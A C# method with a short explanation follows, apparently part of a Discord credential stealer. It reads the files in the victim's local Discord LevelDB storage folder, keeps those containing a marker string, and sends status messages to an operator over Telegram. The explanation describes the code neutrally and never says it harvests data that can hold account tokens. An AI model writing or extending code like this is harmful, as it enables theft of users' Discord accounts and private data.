```csharp
private static List<string> SearchForFile()
{
    // LDB file used to locate Discord client.
    // First, build the path to the Discord client ldb file.
    // If the path does not exist, send a message notification through Telegram.
    // Traverse all ldb files in this path and read their contents.
    // If the file content contains the "okay" string, add the file content to the ldbFiles list.
    var path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Discord\application-ldb";
    if (!Directory.Exists(path))
    {
        telegram.sendText("⛔ Discord application ldb files not found.");
        return new List<string>();
    }

    var ldbFiles = new List<string>();
    foreach (var file in Directory.GetFiles(path, "*.ldb"))
    {
        using (var stream = new FileStream(file, FileMode.Open, FileAccess.Read))
        {
            using (var reader = new StreamReader(stream))
            {
                string contents = reader.ReadToEnd();
                if (contents.Contains("okay"))
                {
                    ldbFiles.Add(contents);
                }
            }
        }
    }

    return ldbFiles;
}
```
This method searches for the `application-ldb` file in the `LocalApplicationData` folder of the Discord application directory. If the folder does not exist, it sends a message notification through Telegram. Then, it reads all the `.ldb` files in the folder and adds their contents to a list of `ldbFiles` if the contents contain the string "okay". Finally, it returns the list of `ldbFiles`.

